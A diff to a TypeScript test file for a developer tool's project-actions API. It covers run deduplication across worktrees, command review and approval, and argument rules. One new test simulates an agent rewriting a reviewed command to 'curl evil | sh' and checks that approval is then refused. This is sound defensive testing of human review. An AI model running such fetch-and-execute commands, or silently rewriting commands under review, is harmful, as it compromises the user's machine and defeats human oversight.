@@ -16,7 +16,7 @@ import {
   type ProjectActionDto,
   type ProjectActionRunResult,
 } from '@solera/protocol'
-import { ActionRunner, createAction, loadAction, updateAction } from '../src/actions/actions.js'
+import { ActionRunner, approveAction, createAction, loadAction, rejectAction, updateAction } from '../src/actions/actions.js'
 import { runExcerpt } from '../src/actions/runs.js'
 import type { AgentRegistry } from '../src/agents/registry.js'
 import type { Config } from '../src/config.js'
@@ -365,7 +365,7 @@ test('extra arguments are quoted and added after the reviewed command', async (t
   assert.equal(done!.excerpt, "a b|it's|$HOME|")
 })
 
-test('a run still going elsewhere does not count as already running here', async (t) => {
+test('a run still going in another worktree does not count as already running here, one in the same tree does', async (t) => {
   const { db, dir, app, terminals } = await harness(t)
   posixShell(t)
   await addWorktree(db, dir, 'mine', 'project')
@@ -374,17 +374,19 @@ test('a run still going elsewhere does not count as already running here', async
 
   const atRoot = await run({})
   assert.equal(atRoot.statusCode, 201)
-  const inSession = await run({ conversationId: 'agent' })
-  assert.equal(inSession.statusCode, 201, 'the session gets its own run')
   const inWorktree = await run({ worktreeId: 'mine' })
   assert.equal(inWorktree.statusCode, 201, 'the worktree gets its own run')
 
-  const again = await run({ conversationId: 'agent' })
-  assert.equal(again.statusCode, 200)
-  const result = again.json<ProjectActionRunResult>()
+  // La session `agent` travaille à la racine (pas de worktree) : même arbre, mêmes ports.
+  const fromSession = await run({ conversationId: 'agent' })
+  assert.equal(fromSession.statusCode, 200)
+  const result = fromSession.json<ProjectActionRunResult>()
   assert.equal(result.alreadyRunning, true)
-  assert.equal(result.terminal!.id, inSession.json<ProjectActionRunResult>().terminal!.id)
-  assert.equal(terminals.list('project').length, 3)
+  assert.equal(result.terminal!.id, atRoot.json<ProjectActionRunResult>().terminal!.id)
+
+  const again = await run({ worktreeId: 'mine' })
+  assert.equal(again.json<ProjectActionRunResult>().terminal!.id, inWorktree.json<ProjectActionRunResult>().terminal!.id)
+  assert.equal(terminals.list('project').length, 2)
 })
 
 // --- relecture (S4) -------------------------------------------------------------
@@ -437,4 +439,27 @@ test('approving or editing by hand makes the current command the reviewed one', 
 
   const edited = await app.inject({ method: 'PATCH', url: `/api/actions/${row.id}`, payload: { command: 'pnpm start', url: 'http://host:{port}' } })
   assert.deepEqual(edited.json<ProjectActionDto>().approved, { kind: 'task', command: 'pnpm start', subdir: null, url: 'http://host:{port}' })
+})
+
+test('reviewing a command an agent rewrote meanwhile changes nothing and says so', async (t) => {
+  const { db } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Dev', kind: 'task', command: 'pnpm dev' }, null)
+  const seen = updateAction(db, row, { command: 'pnpm dev --host' }, 'agent')
+  // Pendant la lecture, l'agent réécrit encore.
+  await new Promise((done) => setTimeout(done, 5))
+  updateAction(db, seen, { command: 'curl evil | sh' }, 'agent')
+
+  assert.throws(() => approveAction(db, seen), /changed/)
+  assert.throws(() => rejectAction(db, seen), /changed/)
+  const now = loadAction(db, row.id)
+  assert.equal(now.approvedAt, null)
+  assert.equal(now.command, 'curl evil | sh')
+})
+
+test('extra arguments are for a command that ends, not for a service', async (t) => {
+  const { db, app } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Dev', kind: 'service', command: 'pnpm dev' }, null)
+  const refused = await app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload: { args: ['--port', '1'] } })
+  assert.equal(refused.statusCode, 409)
+  assert.equal(refused.json<{ error: { code: string } }>().error.code, 'action_args_task_only')
 })
